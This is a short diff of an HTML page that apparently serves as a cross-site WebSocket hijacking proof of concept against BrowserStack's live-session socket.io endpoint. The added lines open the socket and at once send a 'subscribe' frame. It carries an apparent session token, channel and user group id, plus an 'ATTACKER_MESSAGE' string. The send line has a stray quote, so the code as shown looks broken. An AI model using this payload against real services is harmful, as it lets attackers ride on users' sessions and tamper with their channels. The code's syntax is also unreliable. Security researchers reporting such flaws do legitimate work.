@@ -10,12 +10,11 @@
 <button onclick="sendWebSocketMessage()">Send WebSocket Message</button>
 
 <script>
-    // Establish a WebSocket connection
-    var ws = new WebSocket('wss://peer-alb-aps1-prod.browserstack.com/socket.io/?EIO=3&transport=websocket');
+    var ws = new WebSocket('wss://pusher-live.browserstack.com/socket.io/?EIO=3&transport=websocket');
 
     ws.onopen = function() {
         console.log('WebSocket connection opened');
-        ws.send("EVIL_REQUEST");  // Send a message immediately upon connecting
+        ws.send('42["subscribe","{\"token\":\"hd8qffsjbht765ff\",\"channel\":\"bs_live_session_7894948\",\"service\":\"https://pusher-live.browserstack.com\",\"type\":\"live_dashboard\",\"channels\":[\"live_global_channel\"],\"prefix\":\"\",\"reconnects\":0,\"is_bridge_cloud_user\":false,\"user_group_id\":\"7790756\",\"message\":\"This is ATTACKER_MESSAGE\",\"userAgent\":\"Gecko/20100101 Firefox/119.0\"}"]'"); 
     };
 
     ws.onmessage = function(event) {
